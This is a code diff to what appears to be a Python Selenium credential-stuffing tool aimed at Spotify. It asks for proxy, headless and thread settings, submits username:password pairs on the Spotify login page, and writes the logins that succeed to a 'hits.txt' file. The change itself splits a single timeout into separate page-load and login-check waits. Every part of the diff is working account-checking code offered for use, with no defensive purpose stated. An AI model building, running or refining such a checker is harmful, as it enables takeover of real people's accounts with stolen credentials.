@@ -66,7 +66,8 @@ class Main:
         print(title)
         self.use_proxy = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] ['+Fore.RED+'1'+Fore.CYAN+']Proxy ['+Fore.RED+'0'+Fore.CYAN+']Proxyless: '))
         self.headless = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] ['+Fore.RED+'1'+Fore.CYAN+']Headless ['+Fore.RED+'0'+Fore.CYAN+']Not Headless: '))
-        self.max_wait = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Max Wait (seconds): '))
+        self.website_load_max_wait = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Website Load Max Wait (seconds): '))
+        self.login_check_max_wait = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Login Check Max Wait (seconds): '))
         self.wait_before_start = float(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Wait Before Start (seconds): '))
         self.browser_amount = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Threads: '))
         print('')
@@ -105,7 +106,7 @@ class Main:
 
             driver.get('https://accounts.spotify.com/en/login/')
             element_present = EC.presence_of_element_located((By.ID, 'login-username'))
-            WebDriverWait(driver, self.max_wait).until(element_present)
+            WebDriverWait(driver, self.website_load_max_wait).until(element_present)
             username_elem = driver.find_element_by_id('login-username')
             username_elem.send_keys(username)
             password_elem = driver.find_element_by_id('login-password')
@@ -115,7 +116,7 @@ class Main:
 
             try:
                 element_present = EC.url_to_be('https://accounts.spotify.com/en/status')
-                WebDriverWait(driver, self.max_wait).until(element_present)
+                WebDriverWait(driver, self.login_check_max_wait).until(element_present)
                 self.PrintText(Fore.CYAN,Fore.RED,'HIT',f'{username}:{password}')
                 with open('hits.txt','a',encoding='utf8') as f:
                     f.write(f'{username}:{password}\n')
